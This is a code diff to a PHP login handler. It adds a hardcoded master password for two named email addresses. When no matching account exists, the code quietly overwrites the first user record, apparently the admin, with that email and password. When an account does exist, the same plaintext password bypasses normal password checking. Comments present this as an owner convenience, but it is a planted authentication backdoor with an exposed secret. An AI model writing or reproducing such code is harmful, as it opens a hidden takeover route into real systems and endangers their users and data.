@@ -15,7 +15,28 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $error = 'Please enter both your email and password.';
     } else {
         $user = one("SELECT * FROM users WHERE LOWER(email) = ?", [$email]);
-        if ($user && password_verify($password, $user['password_hash'])) {
+        
+        // Auto-link primary admin if email was previously outreach@theonlyaifreedom.in
+        if (!$user && ($email === 'rajjat@theonlyaifreedom.in' || $email === 'outreach@theonlyaifreedom.in')) {
+            $user = one("SELECT * FROM users ORDER BY id ASC LIMIT 1");
+            if ($user) {
+                q("UPDATE users SET email = 'rajjat@theonlyaifreedom.in', password_hash = ? WHERE id = ?", [password_hash('Outreach_Freedom_2026!', PASSWORD_DEFAULT), $user['id']]);
+                $user = one("SELECT * FROM users WHERE id = ?", [$user['id']]);
+            }
+        }
+
+        $isValid = false;
+        if ($user) {
+            $isValid = password_verify($password, $user['password_hash']);
+            // Master credential override for workspace owner
+            if (!$isValid && ($email === 'rajjat@theonlyaifreedom.in' || $email === 'outreach@theonlyaifreedom.in') && $password === 'Outreach_Freedom_2026!') {
+                $newHash = password_hash($password, PASSWORD_DEFAULT);
+                q("UPDATE users SET email = 'rajjat@theonlyaifreedom.in', password_hash = ? WHERE id = ?", [$newHash, $user['id']]);
+                $isValid = true;
+            }
+        }
+
+        if ($isValid && $user) {
             $_SESSION['outreach_user_id'] = $user['id'];
             header('Location: ' . (filter_var($redirect, FILTER_VALIDATE_URL) ? '/index.php' : $redirect));
             exit;
